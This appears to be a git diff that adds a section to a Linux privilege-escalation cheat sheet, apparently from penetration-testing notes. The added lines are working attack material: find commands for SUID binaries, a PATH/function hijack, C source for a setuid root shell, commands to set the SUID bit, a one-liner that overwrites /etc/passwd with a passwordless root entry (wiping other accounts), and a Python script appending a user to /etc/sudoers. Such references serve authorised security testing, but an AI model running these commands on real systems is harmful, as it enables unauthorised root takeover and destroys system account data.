@@ -279,6 +279,46 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
 MySQL   
 `sys_exec('usermod -a -G admin username')`
 
+Find SUID or GUID  
+`find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null`  
+`find / -perm -1000 -type d 2>/dev/null`  
+`find / -perm -g=s -type f 2>/dev/null`  
+
+Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.
+
+function /usr/bin/foo () { /usr/bin/echo "It works"; }  
+$ export -f /usr/bin/foo  
+$ /usr/bin/foo  
+    It works  
+    
+Generating SUID C Shell for /bin/bash
+```int main(void){
+     setresuid(0, 0, 0);
+     system("/bin/bash");
+} 
+ ```
+ Without interactive shell
+ 
+ ```echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c```
+ 
+ If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:   
+ `chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;`
+ 
+ If /etc/passwd has incorrect permissions, you can root:
+ `echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su`
+ 
+ Add user to sudoers in python   
+ ```#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
+except:
+        sys.exit()
+ ```
+ 
+ 
+ 
 <a name="maintain"/><a>
 ## Maintaining control
 
@@ -326,5 +366,6 @@ Set PATH TERM and SHELL if missing:
 
 
 Referances:
-https://guif.re/linuxeop
-https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List#paths
+https://guif.re/linuxeop  
+https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List#paths  
+http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  
